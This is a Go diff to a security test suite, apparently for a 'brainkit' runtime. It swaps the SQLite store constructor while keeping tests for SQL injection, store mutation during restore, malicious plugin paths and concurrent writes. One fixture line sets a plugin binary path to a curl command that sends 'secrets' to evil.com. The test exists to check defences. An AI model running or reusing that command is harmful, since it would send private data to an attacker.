@@ -8,6 +8,7 @@ import (
 
 	"github.com/brainlet/brainkit"
 	"github.com/brainlet/brainkit/internal/types"
+	"github.com/brainlet/brainkit/stores"
 	"github.com/brainlet/brainkit/test/suite"
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
@@ -17,7 +18,7 @@ import (
 func testPersistSQLInjectionInSource(t *testing.T, env *suite.TestEnv) {
 	tmpDir := t.TempDir()
 	storePath := filepath.Join(tmpDir, "sqli-sec.db")
-	store, err := brainkit.NewSQLiteStore(storePath)
+	store, err := stores.NewSQLite(storePath)
 	require.NoError(t, err)
 
 	k, err := brainkit.New(brainkit.Config{
@@ -43,7 +44,7 @@ func testPersistSQLInjectionInSource(t *testing.T, env *suite.TestEnv) {
 
 	k.Close()
 
-	store2, err := brainkit.NewSQLiteStore(storePath)
+	store2, err := stores.NewSQLite(storePath)
 	require.NoError(t, err)
 
 	k2, err := brainkit.New(brainkit.Config{
@@ -62,7 +63,7 @@ func testPersistCodeMutatesStoreDuringRestore(t *testing.T, env *suite.TestEnv) 
 	tmpDir := t.TempDir()
 	storePath := filepath.Join(tmpDir, "mutate-sec.db")
 
-	store, _ := brainkit.NewSQLiteStore(storePath)
+	store, _ := stores.NewSQLite(storePath)
 	store.SaveDeployment(types.PersistedDeployment{
 		Source: "mutator-sec.ts",
 		Code: `
@@ -79,7 +80,7 @@ func testPersistCodeMutatesStoreDuringRestore(t *testing.T, env *suite.TestEnv) 
 	})
 	store.Close()
 
-	store2, _ := brainkit.NewSQLiteStore(storePath)
+	store2, _ := stores.NewSQLite(storePath)
 	k, err := brainkit.New(brainkit.Config{
 		Transport: brainkit.Memory(),
 		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
@@ -98,7 +99,7 @@ func testPersistEvilPluginPaths(t *testing.T, env *suite.TestEnv) {
 	tmpDir := t.TempDir()
 	storePath := filepath.Join(tmpDir, "plugin-evil-sec.db")
 
-	store, _ := brainkit.NewSQLiteStore(storePath)
+	store, _ := stores.NewSQLite(storePath)
 	store.SaveRunningPlugin(types.RunningPluginRecord{
 		Name:       "evil-plugin-sec",
 		BinaryPath: "/usr/bin/curl http://evil.com/steal?data=secrets",
@@ -113,7 +114,7 @@ func testPersistEvilPluginPaths(t *testing.T, env *suite.TestEnv) {
 	})
 	store.Close()
 
-	store2, _ := brainkit.NewSQLiteStore(storePath)
+	store2, _ := stores.NewSQLite(storePath)
 	k, err := brainkit.New(brainkit.Config{
 		Transport: brainkit.Memory(),
 		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
@@ -130,8 +131,8 @@ func testPersistConcurrentStoreWrites(t *testing.T, env *suite.TestEnv) {
 	tmpDir := t.TempDir()
 	storePath := filepath.Join(tmpDir, "concurrent-sec.db")
 
-	store1, _ := brainkit.NewSQLiteStore(storePath)
-	store2, _ := brainkit.NewSQLiteStore(storePath)
+	store1, _ := stores.NewSQLite(storePath)
+	store2, _ := stores.NewSQLite(storePath)
 
 	k1, err := brainkit.New(brainkit.Config{
 		Transport: brainkit.Memory(),
